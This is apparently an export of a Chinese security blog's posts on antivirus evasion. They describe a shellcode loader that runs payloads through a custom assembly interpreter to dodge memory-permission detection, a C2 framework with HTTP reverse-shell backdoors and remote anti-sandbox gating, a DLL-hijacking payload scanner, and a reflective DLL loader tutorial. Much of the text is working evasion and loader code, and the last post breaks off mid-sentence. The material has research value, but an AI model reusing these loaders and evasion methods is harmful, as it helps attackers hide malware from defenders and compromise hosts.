[{"title":"无可执行权限加载 ShellCode 技术原理","url":"/2024/08/15/%E6%97%A0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%E5%8A%A0%E8%BD%BD%20ShellCode%20%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/","content":"介绍无需解密，无需 X 内存，直接加载运行 R 内存中的 ShellCode 密文。\nx64 项目: https://github.com/HackerCalico/No_X_Memory_ShellCode_Loader\n规避了以下特征：\n(1) 申请 RWX 属性的内存。\n(2) 来回修改 W 和 X 的内存属性。\n(3) 内存中出现 ShellCode 特征码。\n\n常规 ShellCode 加载器在大家刚开始学习 ShellCode 的时候，通常不明白 ShellCode 本身是什么，而是仅仅学习了以下加载器的写法：\nunsigned char buf[] = &quot;ShellCode 密文&quot;;void* p = VirtualAlloc(NULL, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);memcpy(p, buf, sizeof buf);// ShellCode 解密((void(*)())p)();\n\n上述加载器直接将 ShellCode 密文写入 RWX (可读可写可执行) 内存解密，进而调用。此时进程内存中出现了少见且敏感的 RWX 内存空间，容易被查杀。\n为了避免使用 RWX 内存属性，大家开始先将 ShellCode 密文写入 RW 内存解密，再将内存属性改为 RX 运行。如果 Hook CS 直接生成的后门程序，就会发现在执行一些敏感功能时，后门采取了这种来回修改内存属性的操作，容易被行为查杀。\n于是我开始思考是否存在完全规避以上问题的方法。\nShellCode 作用原理为了找到新的 ShellCode 加载方式，我决定深入了解 ShellCode。\nShellCode 是一段地址无关机器码。机器码就是代码对应的汇编指令的硬编码，通常存在于程序文件的 .text 段中，比如以下 MyMessageBoxA_Not 函数：\n\n该函数的硬编码与汇编指令：\n48 83 EC 38       ------&gt; SUB RSP, 0X38C6 44 24 20 00    ------&gt; MOV BYTE PTR [RSP + 0X20], 041 B9 40 00 00 00 ------&gt; MOV R9D, 0X404C 8D 44 24 20    ------&gt; LEA R8, [RSP + 0X20]48 8D 54 24 20    ------&gt; LEA RDX, [RSP + 0X20]33 C9             ------&gt; XOR ECX, ECXFF 15 2F 12 00 00 ------&gt; CALL QWORD PTR [RIP + 0X122F]48 83 C4 38       ------&gt; ADD RSP, 0X38C3                ------&gt; RET\n\n可以看到通过 Call 指令调用 MessageBoxA 这个 Windows API，但是很明显 MessageBoxA 的地址存储在其他位置，所以如果单独运行这段机器码会运行失败。\nShellCode 地址无关，意味着不直接使用这种外部的地址。实现的方法是，在写代码的过程中不直接调用 Windows API，而是主动获取 Windows API 的地址进行调用，比如以下 MyMessageBoxA 函数：\ntypedef int(WINAPI* pMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);#pragma code_seg(&quot;.shell&quot;)void MyMessageBoxA(pMessageBoxA funcMessageBoxA) &#123;    char text[] = &#123; &#x27;\\0&#x27; &#125;;    funcMessageBoxA(0, text, text, MB_ICONINFORMATION);&#125;#pragma code_seg(&quot;.text&quot;)int main() &#123;    MyMessageBoxA(MessageBoxA);&#125;\n\n该函数使用的 MessageBoxA 的地址通过参数从外部传入，所以该函数的机器码可以作为 ShellCode 直接运行。\n\n新型加载器的实现分析通过对 ShellCode 深入了解，可以知道 ShellCode 其实就是按照地址无关标准编写的代码对应的汇编指令的硬编码，而汇编指令与硬编码是相对应的。\n所以可以说，运行 ShellCode 就是运行其汇编指令，只要实现了其汇编指令的等效功能，就是实现了 ShellCode 的等效运行。\n于是当前的研究转化为其汇编指令实现了什么功能。\n通过学习汇编语言，可以知道这些汇编指令简单来说就是不断修改寄存器、栈、内存的值，通过不断的修改构造好调用 Windows API 所需的参数，进而成功调用 Windows API。\n函数参数的构造过程可以通过上文的 MyMessageBoxA 来简单解释，该函数通过以下代码调用：\nMyMessageBoxA(MessageBoxA);\n\n该行代码实际上就构造好了函数的参数，其汇编指令：\nmov rcx,qword ptr [__imp_MessageBoxA]call MyMessageBoxA\n\n汇编指令将 MessageBoxA 的地址放入了 RCX 寄存器，这就是一个简单的构造过程。复杂的过程比如要对字符串循环解密等，可以统一认为是构造函数参数的过程。\n于是当前的研究转化为如何用其他办法构建好 Windows API 的参数来调用。\n我想到的办法是实现汇编指令的解释器。解释器是一种逐行对代码进行词法、语法、语义等分析进行运行的程序。\n只要我传入汇编指令的文本，解释器逐条指令解析实现对应的功能即可。这里涉及到几个问题。比如解释到 mov rsp, 0x00，此时不应该将真实 RSP 寄存器的值改为 0x00，这样会导致解释器本身错误。解决办法是实现虚拟寄存器和虚拟栈，将虚拟的 vtRSP 改为 0x00。在解释 Windows API 的调用指令时，先将虚拟寄存器的值覆盖真实寄存器，此时 Windows API 的参数为构造完整的状态，之后直接调用 Windows API 即可成功。\n下面以 MyMessageBoxA 为例演示解释过程：\n该函数的汇编指令：\nMOV QWORD PTR [RSP + 8], RCXSUB RSP, 0X38MOV BYTE PTR [RSP + 0X20], 0MOV R9D, 0X40LEA R8, [RSP + 0X20]LEA RDX, [RSP + 0X20]XOR ECX, ECXCALL QWORD PTR [RSP + 0X40]ADD RSP, 0X38RET\n\n模拟解释器：\n以下代码忽略了汇编指令的解析过程，直接模拟每条指令对虚拟值修改进而构造好 Windows API 的参数，将虚拟值覆盖真实值后成功调用 Windows API。\n注：需要配置 Clang 环境以支持 x64 内联汇编。\nVisual Studio Installer ——&gt; 单个组件 ——&gt; LLVM (clang-cl) + Clang ——&gt; 安装\nVisual Studio ——&gt; 项目属性 ——&gt; 常规 ——&gt; 平台工具集 (LLVM (clang-cl))\n\n// 虚拟栈PVOID vtStack = malloc(0x10000);// 虚拟栈顶DWORD64 vtRSP = (DWORD64)vtStack + 0x9000;// mov rcx,qword ptr [__imp_MessageBoxA]DWORD64 vtRCX = (DWORD64)MessageBoxA;// call MyMessageBoxAvtRSP -= 8;// MOV QWORD PTR [RSP + 8], RCX*(PDWORD64)(vtRSP + 8) = vtRCX;// SUB RSP, 0x38vtRSP -= 0x38;// MOV BYTE PTR [RSP + 0x20], 0*(PBYTE)(vtRSP + 0x20) = 0;// MOV R9D, 0x40DWORD64 vtR9 = 0x40;// LEA R8, [RSP + 0x20]DWORD64 vtR8 = vtRSP + 0x20;// LEA RDX, [RSP + 0x20]DWORD64 vtRDX = vtRSP + 0x20;// XOR ECX, ECXvtRCX ^= vtRCX;// 虚拟寄存器 覆盖 真实寄存器__asm &#123;    mov rcx, vtRCX    mov rdx, vtRDX    mov r8, vtR8    mov r9, vtR9    mov rsp, vtRSP&#125;// CALL QWORD PTR [RSP + 0x40]__asm &#123;    call qword ptr[rsp + 0x40]&#125;// ADD RSP, 0x38vtRSP += 0x38;// RETvtRSP += 8;\n","categories":["免杀"],"tags":["技术"]},{"title":"No_X_Memory_ShellCode_Loader","url":"/2024/08/13/No_X_Memory_ShellCode_Loader/","content":"介绍无需解密，无需 X 内存，直接加载运行 R 内存中的 ShellCode 密文。\nx64 项目: https://github.com/HackerCalico/No_X_Memory_ShellCode_Loader\n规避了以下特征：\n(1) 申请 RWX 属性的内存。\n(2) 来回修改 W 和 X 的内存属性。\n(3) 内存中出现 ShellCode 特征码。\n\n技术原理加载流程：\n(1) 正常生成 ShellCode 机器码。\n(2) ShellCode — 转换器 —&gt; 自定义汇编指令。\n(3) 解释器 运行 自定义汇编指令。\n详细介绍：\nhttps://hackercalico.github.io/2024/08/13/%E6%97%A0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%E5%8A%A0%E8%BD%BD%20ShellCode%20%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/\n项目文件ShellCode：多种 ShellCode 源码。\nConverter：自定义汇编指令转换器。\npip install capstone\n\nLoader：ShellCode 加载器 (自定义汇编指令解释器)。\nGenerateAsmInstruction：用于生成 Loader\\AsmInstruction.asm 函数汇编指令。\n转换器使用与实现为了减轻解释器的压力，我们的自定义汇编指令一定要设计成容易解释的格式。\n下面对本项目提供的 CMD 命令执行 ShellCode 案例进行讲解：\n(1) 生成原始汇编指令\n将 ShellCode 机器码 (ShellCode.txt) 转为原始汇编指令 (asm.txt)。\n该功能简单利用 capstone 库实现。\n&gt; python Converter.py1.反汇编2.Imul转换3.生成自定义汇编指令选择: 1ShellCode使用的汇编指令: &#123;&#x27;lea&#x27;, &#x27;cdqe&#x27;, ......, &#x27;repStosb&#x27;&#125;汇编指令生成完毕: asm.txt\n\nasm.txt：\n0x0_mov_qword ptr [rsp + 0x20], r90x5_mov_qword ptr [rsp + 0x18], r80xa_mov_dword ptr [rsp + 0x10], edx......\n\n(2) 修改 asm.txt\n考虑到原始汇编指令可能存在一些特殊情况，需要进行修改。所以我将转换过程分为了先转为原始汇编指令，再转为自定义汇编指令两个阶段。\n观察原始汇编指令，可以发现存在 imul 指令，并且全部为 imul a, a, b 的格式。我们直接把它们全部转为 imul a, b 的格式方便处理。\n&gt; python Converter.py1.反汇编2.Imul转换3.生成自定义汇编指令选择: 2已将 asm.txt 中的 imul a, a, b 全部转换为 imul a, b\n\n(3) 生成自定义汇编指令\n将 asm.txt 中的原始汇编指令转为自定义汇编指令。\n&gt; python Converter.py1.反汇编2.Imul转换3.生成自定义汇编指令选择: 30_4_q_pq70+i20_q_q38_......2ed_3_q__q__!PVOID mnemonicMap[] = &#123; Push, Pop, ......, Jle &#125;;\n\n0_4_q_pq70+i20_q_q38 为第一条自定义汇编指令，! 为整个自定义汇编指令的结束标志。\n第一条的原始汇编指令：0x00 mov qword ptr [rsp + 0x20], r9\n指令地址：0x00 ——&gt; 0\n在处理 Jcc 跳转指令时需要使用，去掉 0x 减短长度。\n助记符：mov ——&gt; 4\n4 为 mov 在 mnemonicMap 中的下标。\n解释器逐条指令执行，通过下标获取 mnemonicMap 中当前指令的处理函数指针，进行反射调用。避免了解释器代码中出现大量 if else 或 switch case。\n操作数1：qword ptr [rsp + 0x20] ——&gt; q_pq70+i20\nq 表示 QWORD，p 表示 ptr。\nq70 表示 vtRSP。在解释器中通过 vtRegs 数组存储虚拟寄存器的值，70 是 vtRSP 相对 vtRegs 基址的偏移，直接通过地址操作寄存器的值。避免了解释器代码中出现大量不同位数的寄存器的定义，以及繁琐操作。\ni20 表示立即数 0x20。\n操作数2：r9 ——&gt; q_q38\nq 表示 QWORD。\nq38 表示 R9，同理偏移。\n解释器实现(1) 创建虚拟栈和虚拟寄存器\nPVOID vtStack = malloc(0x10000);DWORD_PTR vtRegs[18] = &#123; 0 &#125;;vtRegs[14] = vtRegs[15] = (DWORD_PTR)vtStack + 0x9000;\n\n14 和 15 分别对应 vtRSP 和 vtRBP。\n(2) 设置虚拟寄存器的初值\n因为解释器是从 ShellCode 函数的开头进行模拟的，所以在模拟开始之前，要先在虚拟空间中构建出 ShellCode 函数的参数。\n本项目提供的 CMD 命令执行 ShellCode 函数通过以下代码调用：\nExecuteCmd(commandPara, commandParaLength, &amp;outputData, &amp;outputDataLength, funcAddr);\n\n该行代码对应的汇编指令：\nlea rax, [funcAddr]mov qword ptr [rsp+20h], raxlea r9, [outputDataLength]lea r8, [outputData]mov edx, dword ptr [commandParaLength]lea rcx, [commandPara]call ExecuteCmd\n\n所以要通过以下代码在虚拟空间中构建出函数参数：\nvtRegs[0] = (DWORD_PTR)pFuncAddr;*(PDWORD_PTR)(vtRegs[14] + 0x20) = vtRegs[0];vtRegs[7] = (DWORD_PTR)pOutputDataLength;vtRegs[6] = (DWORD_PTR)pOutputData;vtRegs[3] = commandParaLength;vtRegs[2] = (DWORD_PTR)commandPara;vtRegs[14] = vtRegs[14] - sizeof(DWORD_PTR);\n\n(3) 解析自定义汇编指令\n根据 指令地址_助记符_位数1_操作数1_位数2_操作数2 的格式将每条指令的元素解析出来。\n通过 GetOpTypeAndAddr 函数获取每个操作数的类型和地址，每种指令的处理函数会直接通过操作数的地址对其值进行操作，非常方便。\n如果操作数是立即数，例如 i12 (0x12)。则直接通过 strtol 函数将 12 字符串转为数字，该数字的地址即为该操作数的地址。\n如果操作数是 lea 的第二个操作数或内存空间，例如 lq70+i20 ([rsp + 0x20]) 或 pq70+i20 (ptr [rsp + 0x20])。则先解析其子元素进行计算，计算结果保存到 number1。如果操作数是 lea 的第二个操作数，则 number1 的地址即为该操作数的地址。如果操作数是内存空间，则 number1 的值即为该操作数的地址。\n如果操作数是寄存器，例如 q70 (rsp)。70 是 vtRSP 相对 vtRegs 基址的偏移，则 vtRegs 基址 + 70 即为该操作数的地址。\n// 获取操作数值的 类型(r寄存器/m内存空间) + 地址DWORD_PTR GetOpTypeAndAddr(char* op, char* pOpType1, PDWORD_PTR pVtRegs, PDWORD_PTR opNumber) &#123;    ......    // 立即数    if (op[0] == &#x27;i&#x27;) &#123;        *opNumber = strtol(op + 1, &amp;endPtr, 16);        return (DWORD_PTR)opNumber;    &#125;    // lea [] / ptr []    else if (op[0] == &#x27;l&#x27; || op[0] == &#x27;p&#x27;) &#123;        ......        // 解析算式 (未考虑“*”)        ParseFormula(op + 1, formula, symbols);        // 计算 (未考虑“*”)        DWORD_PTR number1 = 0;        ......        // lea []        if (op[0] == &#x27;l&#x27;) &#123;            *opNumber = number1;            return (DWORD_PTR)opNumber;        &#125;        // ptr []        if (pOpType1 != NULL) &#123;            *pOpType1 = &#x27;m&#x27;;        &#125;        return number1;    &#125;    // 寄存器    else &#123;        if (pOpType1 != NULL) &#123;            *pOpType1 = &#x27;r&#x27;;        &#125;        return (DWORD_PTR)pVtRegs + strtol(op + 1, &amp;endPtr, 16);    &#125;&#125;\n\n(4) 调用对应指令的处理函数\n通过解析得到的当前指令的下标获取当前指令的处理函数指针。\nPVOID mnemonicMap[] = &#123; Push, Pop, ......, AsmJle &#125;;PVOID instructionFunc = mnemonicMap[mnemonicIndex];\n\n下面举几种指令的处理函数的例子：\nMov 指令\n// 其他两个操作数的指令else &#123;    ((void(*)(...))instructionFunc)(opType1, opBit1, opAddr1, opBit2, opAddr2);&#125;\n\nvoid Mov(char opType1, char opBit1, DWORD_PTR opAddr1, char opBit2, DWORD_PTR opAddr2) &#123;    switch (opBit1)    &#123;    case &#x27;q&#x27;:        *(PDWORD64)opAddr1 = *(PDWORD64)opAddr2;        break;    case &#x27;d&#x27;:        if (opType1 == &#x27;r&#x27;) &#123;            *(PDWORD_PTR)opAddr1 = *(PDWORD)opAddr2;        &#125;        else &#123;            *(PDWORD)opAddr1 = *(PDWORD)opAddr2;        &#125;        break;    case &#x27;w&#x27;:        *(PWORD)opAddr1 = *(PWORD)opAddr2;        break;    case &#x27;b&#x27;:        *(PBYTE)opAddr1 = *(PBYTE)opAddr2;        break;    &#125;&#125;\n\ncase ‘d’ 表示 操作数1 为 DWORD，在 操作数1 类型为 DWORD 寄存器时存在特殊情况。\n特殊情况通过下例来解释：\nmov rax, 0x1234567812345678mov eax, 0x11111111\n\n运行后 rax 为 0x0000000011111111。\nCmp 指令\nelse if (instructionFunc == AsmCmp || instructionFunc == AsmTest) &#123;     ((void(*)(...))instructionFunc)(opBit1, opAddr1, opAddr2, pVtRegs);&#125;\n\n将两个操作数的值赋值到 r10 和 r11，计算完成后将标志寄存器的值赋值到 vtEFL。\nvoid AsmCmp(char opBit1, DWORD_PTR opAddr1, DWORD_PTR opAddr2, PDWORD_PTR pVtRegs) &#123;    __asm &#123;        mov r8, qword ptr[opAddr1]        mov r9, qword ptr[opAddr2]        mov r10, qword ptr[r8]        mov r11, qword ptr[r9]    &#125;    DWORD_PTR vtEFL;    switch (opBit1)    &#123;    case &#x27;q&#x27;:        __asm &#123;            cmp r10, r11            pushf            pop rax            mov vtEFL, rax        &#125;        break;    ......    &#125;    pVtRegs[17] = vtEFL;&#125;\n\nJcc 指令\n传入具体的 Jcc 指令的处理函数指针。\nJcc(instructionFunc, opAddr1, pVtRegs);\n\n通过具体的 Jcc 指令的处理函数判断是否跳转。如果跳转，则将 操作数1 的值赋值给 vtRIP。\nvoid Jcc(PVOID instructionFunc, DWORD_PTR opAddr1, PDWORD_PTR pVtRegs) &#123;    DWORD_PTR vtEFL = pVtRegs[17];    int isJmp = ((int(*)(...))instructionFunc)(vtEFL);    if (isJmp) &#123;        DWORD_PTR vtRIP = *(PDWORD_PTR)opAddr1;        pVtRegs[16] = vtRIP;    &#125;&#125;\n\nJe 指令\n作为具体的 Jcc 指令的处理函数，先将 vtEFL 的值赋值到标志寄存器，再判断是否跳转。\nint AsmJe(DWORD_PTR vtEFL) &#123;    int isJmp = 1;    __asm &#123;        mov rax, vtEFL        push rax        popf        je jmp        mov isJmp, 0x00        jmp :    &#125;    return isJmp;&#125;\n\nCall 指令\n其实现是所有指令中最复杂的，因为涉及到 Windows API 的调用。\n首先保存真实栈顶栈底，最后还原真实栈顶栈底，保证解释器能正常运行。\n调用 Windows API 之前，要先将虚拟寄存器的值覆盖真实寄存器的值，相当于构造好 Windows API 的参数。\n调用完 Windows API 之后，要将真实寄存器的值覆盖虚拟寄存器的值。\nvoid AsmCall(DWORD_PTR opAddr1, PDWORD_PTR pVtRegs) &#123;    // 保存真实栈顶栈底    DWORD_PTR realRSP;    DWORD_PTR realRBP;    __asm &#123;        mov realRSP, rsp        mov realRBP, rbp    &#125;    // Window API 地址    DWORD_PTR winApiAddr = *(PDWORD_PTR)opAddr1;    // 虚拟寄存器 覆盖 真实寄存器    DWORD_PTR vtRAX = pVtRegs[0];    ......    DWORD_PTR vtRBP = pVtRegs[15];    __asm &#123;        mov rax, vtRAX        ......        mov rsp, vtRSP        // mov rbp, vtRBP (与 Call 冲突)    &#125;    // 调用 Windows API    __asm &#123;        call qword ptr[winApiAddr] // (call qword ptr [rbp])    &#125;    // 保存调用 Windows API 后真实寄存器的值    __asm &#123;        push rax        ......        push rbp    &#125;    // 真实寄存器 覆盖 虚拟寄存器    DWORD_PTR currentRSP;    __asm &#123;        mov currentRSP, rsp;    &#125;    pVtRegs[0] = *(PDWORD_PTR)(currentRSP + 0x78); // RAX    ......    pVtRegs[14] = *(PDWORD_PTR)(currentRSP + 0x08) + 0x70; // RSP    pVtRegs[15] = *(PDWORD_PTR)(currentRSP + 0x00); // RBP    // 还原真实栈顶栈底    __asm &#123;        mov rsp, realRSP        mov rbp, realRBP    &#125;&#125;\n","categories":["免杀"],"tags":["项目"]},{"title":"Magic_C2","url":"/2024/08/14/Magic_C2/","content":"介绍Version: Magic C2 v1.0.0 Beta\n项目: https://github.com/HackerCalico/Magic_C2\n我相信每一位黑客都有自己的梦想！而我的其中一个就是拥有一款自己的 C2，因为实在是太酷啦！\n在首发版本的 Issues 中，我看到了大家反馈的许多问题。所以我在近两周的时间里进行了大范围的整改优化，最终得到此版本。虽然与一个成熟的 C2 框架还有一定距离，但也已经非常棒了！\n\n项目亮点(1) 远程抗沙箱\n后门的 ShellCode Loader 本身具备通信功能，用户可远程查看沙箱检测数据，进而远程决定后门是否从 “待定” 阶段进入 “正式上线” 阶段，如图1。\n确定进入 “正式上线” 阶段后，服务端会向后门发送 ShellCode 密钥，进而解密加载。\n规避优势：\n\n即使传输与沙箱检测无关的数据，也可以利用时长绕过部分沙箱检测。\n\n因为是人工判定，所以沙箱检测数据可以比常规方式更加灵活，比如图中获取的就是目标主机的截图。\n\nShellCode 密钥由服务端发送，在病毒分析中无法通过简单的方式跳过抗沙箱阶段得到 ShellCode 明文。\n\n\n(2) 隐蔽的 ShellCode 调用接口\n本项目结合了 No_X_Memory_ShellCode_Loader 技术: https://github.com/HackerCalico/No_X_Memory_ShellCode_Loader\n后门进入 “正式上线” 阶段后的所有非通信功能均通过 “自定义汇编解释器” 运行：\n\n客户端将功能 ShellCode 转为 “自定义汇编指令” ——&gt; 服务端\n\n服务端 ——&gt; 后门 “自定义汇编解释器”\n\n\n规避优势：\n\n向后门注入任何新功能无需进行任何内存属性 (R&#x2F;W&#x2F;X) 修改操作。\n\n内存中任何时候都不会出现新功能的 ShellCode 机器码。\n\n\n(3) 告警通知\n服务端在处理无效的凭证或请求数据时，只会响应空白 &#x2F; 404，并向所有客户端告警，如图1。\n(4) 文件分块传输\n文件上传下载均采用分块传输，支持随时暂停、取消与修改块的大小。\n\n(5) 二次开发\n项目完全开源，代码简洁，未使用高级语法，插件均为 Python，易于二次开发。\n二次开发(1) 插件开发\n在 Client\\script 文件夹中可以看到所有插件。\nClient|— script    |— cmd    |— inject    |— help    |— GetFileInfoList_    |— UploadFile_    ......\n\n其中所有非 “_” 结尾的插件均为 “命令终端” 模块的插件，模块如图。\n所有插件功能均通过 “自定义汇编解释器” 运行，所以必须先学习 https://github.com/HackerCalico/No_X_Memory_ShellCode_Loader\nPython 编写规范可参考 cmd 插件。\n\n目前其他 “_” 结尾的插件均为 “文件管理” 模块的插件，模块如图。\n\n(2) 后门开发\n在 Shell 文件夹中可以看到 “HTTP 反向 Shell” 和 “HTTP 反向 Loader” 的源码项目。\n“HTTP 反向 Shell” 为核心功能的 “反射 DLL ShellCode” 项目。\n“HTTP 反向 Loader” 为其 “ShellCode Loader” 项目，包含了 “远程抗沙箱” 功能。\nShell|— HttpReverseShell    |— HttpReverseShell.sln|— HttpReverseLoader    |— HttpReverseLoader.sln\n\nShellCode Loader 生命周期：\n\nShellCode 生命周期：\n\n(3) 生成器开发\n在 Shell\\Generator 文件夹中可以看到一个 NormalXor 生成器文件夹，NormalXor 文件夹中有一个 Generator.py 和一个 Profile.txt。\nShell|— Generator    |— NormalXor        |— Generator.py        |— Profile.txt\n\n在使用 “后门生成” 模块时，只要选择 Profile.txt，客户端就会调用与 Profile.txt 同文件夹下的 Generator.py 对后门源码进行 修改代码 - 编译代码 - 还原代码，来生成 ShellCode、EXE。\n用户可以在 Generator 文件夹中创建不同的生成器文件夹，也可以在一个生成器文件夹中创建不同 Profile.txt。\n(4) 更多二次开发\n可以结合 “命令控制模型” (客户端 - 服务端 - 后门) 对项目源码进行更深的理解。\n\n免责声明(1) 本项目仅用于网络安全技术的学习研究。旨在提高安全开发能力，研发新的攻防技术。\n(2) 若执意要将本项目用于渗透测试等安全业务，需先确保已获得足够的法律授权，在符合网络安全法的条件下进行。\n(3) 本项目由个人独立开发，暂未做全面的软件测试，请使用者在虚拟环境中测试本项目的功能。\n(4) 本项目完全开源，请勿将本项目用于任何商业用途。\n(5) 若使用者在使用本项目的过程中存在任何违法行为或造成任何不良影响，需使用者自行承担责任，与项目作者无关。\n","categories":["免杀"],"tags":["项目"]},{"title":"Unique_DLL_Hijacking_Scan","url":"/2024/08/12/Unique_DLL_Hijacking_Scan/","content":"介绍项目: https://github.com/HackerCalico/Unique_DLL_Hijacking_Scan\nDLL Hijacking 批量挖掘工具，用于快速生成指定文件夹下所有 EXE 的 Unique DLL Hijacking Payload。\n\n","categories":["免杀"],"tags":["项目"]},{"title":"反射 DLL 加载器原理与实现","url":"/2024/08/15/%E5%8F%8D%E5%B0%84%20DLL%20%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/","content":"介绍Windows 的 PE 文件通过系统的 PE 加载器来加载运行。比如双击一个 EXE 时，PE 加载器会将其从磁盘映射到内存中，并通过补充导入表、基址重定位等操作使其能运行。\n反射 DLL 加载就是自己实现一个 PE 加载器来加载运行 DLL，DLL 可以加密存储在内存、云端、本地文件等任意位置，达到恶意程序隐藏效果。\n反射加载流程与实现PE 结构如图：\n\n下面逐个加载步骤进行讲解\n先生成一个简单的实验用 DLL\n#include &quot;pch.h&quot;/** 1.Release x64* 2.C/C++* 代码生成: 运行库(多线程)* 3.链接器* 清单文件: 生成清单(否)* 调试: 生成调试信息(否)*/BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) &#123;    switch (ul_reason_for_call)    &#123;    case DLL_PROCESS_ATTACH:        MessageBoxA(0, &quot;&quot;, &quot;&quot;, MB_ICONINFORMATION);    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    &#125;    return TRUE;&#125;\n\n获取 DLL 数据\n以从文件读取 DLL 数据为例。\nHANDLE hFile = CreateFileA((char*)&quot;D:\\\\DLL.bin&quot;, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);DWORD fileSize = GetFileSize(hFile, NULL);PVOID dllData = VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);DWORD readFileSize;ReadFile(hFile, dllData, fileSize, &amp;readFileSize, NULL);\n\n解析 PE 结构信息\nPE 的开头即为 DOS 头，通过 DOS 头的 e_lfanew 字段可以定位到 NT 头。\nPIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dllData;PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllData + pDos-&gt;e_lfanew);\n\nNT 头中有很多记录了 PE 结构信息的字段和结构。\n\nNumberOfSections 字段是 Sections 的数量，Sections 包括 .text、.rdata、.data、.reloc 等，.text 其实就是要运行的汇编的机器码，其他 Sections 起到了存储数据等作用。\nPE 映射到内存中称为 Image，ImageBase 字段可以理解为一个虚构的 Image 基址，因为 PE 加载前不知道 Image 的真实基址，所以先假设一个。\nSizeOfImage 字段是 Image 的大小。\nNT 头中的 OptionalHeader 中有一个元素为 IMAGE_DATA_DIRECTORY 的 DataDirectory 数组，其中下标为 IMAGE_DIRECTORY_ENTRY_IMPORT 的元素记录了 “导入表” 相对 ImageBase 的偏移，下标为 IMAGE_DIRECTORY_ENTRY_BASERELOC 的记录了 “基址重定位表” 的偏移。\nWORD numberOfSections = pNt-&gt;FileHeader.NumberOfSections;DWORD_PTR imageBase = pNt-&gt;OptionalHeader.ImageBase;DWORD sizeOfImage = pNt-&gt;OptionalHeader.SizeOfImage;DWORD importDirRVA = ((IMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT])).VirtualAddress;DWORD relocDirRVA = ((IMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC])).VirtualAddress;\n\n映射 Sections 到内存\n从图1可以看出 Sections 映射到内存后位置会发生变化。此处没有映射 DOS、NT、节表到内存是因为它们在 PE 加载后的运行期间起不到任何作用，反而会成为查杀特征。\n每个节表记录了一个 Section 的信息，Name 字段为当前 Section 的名称，SizeOfRawData 字段为当前 Section 的大小，PointerToRawData 字段为当前 Section 相对 PE 原数据首地址的偏移，VirtualAddress 字段为当前 Section 相对 ImageBase 的偏移。\n先定位到第一个节表，节表紧挨在 NT 头后面，而 NT 头最后一个结构是 OptionalHeader，所以 OptionalHeader 首地址 + OptionalHeader 大小即为第一个节表的首地址。\n分配一块可读可写的空间用于存储 Image，再通过遍历节表根据每个节表记录的信息将每个 Section 映射到正确位置。需要特别记录 .text 的地址和大小，最后要改为可读可执行权限。\nint textSize;DWORD_PTR textAddr;DWORD_PTR realImageBase = (DWORD_PTR)VirtualAlloc(NULL, sizeOfImage, MEM_COMMIT, PAGE_READWRITE);PIMAGE_SECTION_HEADER pSectionTable = (PIMAGE_SECTION_HEADER)((DWORD_PTR) &amp; (pNt-&gt;OptionalHeader) + pNt-&gt;FileHeader.SizeOfOptionalHeader);for (int i = 0; i &lt; numberOfSections; i++) &#123;    if (!strcmp((char*)pSectionTable[i].Name, &quot;.text&quot;)) &#123;        textAddr = realImageBase + pSectionTable[i].VirtualAddress;        textSize = pSectionTable[i].SizeOfRawData;    &#125;    memcpy((PVOID)(realImageBase + pSectionTable[i].VirtualAddress), (PVOID)((DWORD_PTR)dllData + pSectionTable[i].PointerToRawData), pSectionTable[i].SizeOfRawData);&#125;\n\n补充导入表\n每个导入表记录了 PE 在运行时需要导入的一个 DLL 的名称等信息，每个导入表可定位到的每个 IAT 表记录了需要调用该 DLL 中的一个函数的名称等信息，但是没有记录这些函数的地址。\n\n因为每个 DLL 加载到内存中的地址是不固定的，自然每个函数的地址也是不固定的，所以需要我们自己找到每个函数的地址填充到每个 IAT 表中。\n先通过偏移定位到第一个导入表。遍历每个导入表时，先获取要导入的 DLL 名称并导入该 DLL，再通过偏移定位到当前导入表的第一个 IAT 表，遍历每个 IAT 表，先判断该函数通过 “序号” 还是 “函数名” 进行导入，以正确的方式获取该函数的地址后填充到当前 IAT 表中。\nPIMAGE_IMPORT_DESCRIPTOR pImportDir = (PIMAGE_IMPORT_DESCRIPTOR)(realImageBase + importDirRVA);while (pImportDir-&gt;FirstThunk) &#123;    char* dllName = (char*)(realImageBase + pImportDir-&gt;Name);    HMODULE importDll = LoadLibraryA(dllName);    PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(realImageBase + pImportDir-&gt;FirstThunk);    while (pIAT-&gt;u1.AddressOfData) &#123;        // 通过 &quot;序号&quot; 导入        if (IMAGE_SNAP_BY_ORDINAL(pIAT-&gt;u1.Ordinal)) &#123;            *(PDWORD_PTR)pIAT = (DWORD_PTR)GetProcAddress(importDll, (char*)(*(PDWORD_PTR)pIAT &amp; 0xFFFF));        &#125;        // 通过 &quot;函数名&quot; 导入        else &#123;            PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(realImageBase + pIAT-&gt;u1.AddressOfData);            *(PDWORD_PTR)pIAT = (DWORD_PTR)GetProcAddress(importDll, pImportByName-&gt;Name);        &#125;        pIAT++;    &#125;    pImportDir++;&#125;\n\n基址重定位\nPE 原数据中有一些虚构的绝对地址，它们是以 ImageBase 字段为基准设置的。\n在 PE 加载过程中已经分配了 Image 的空间，所以已经知道了 Image 的真实基址，就可以根据真实基址和 ImageBase 字段的差值对这些虚构的绝对地址重新校准了。\n每个基址重定位表由两部分构成，第一部分的 VirtualAddress 字段为一个需要进行重定位的页的偏移地址，SizeOfBlock 字段为当前重定位表的大小，第一部分的大小为 sizeof(IMAGE_BASE_RELOCATION)。第二部分由很多大小为 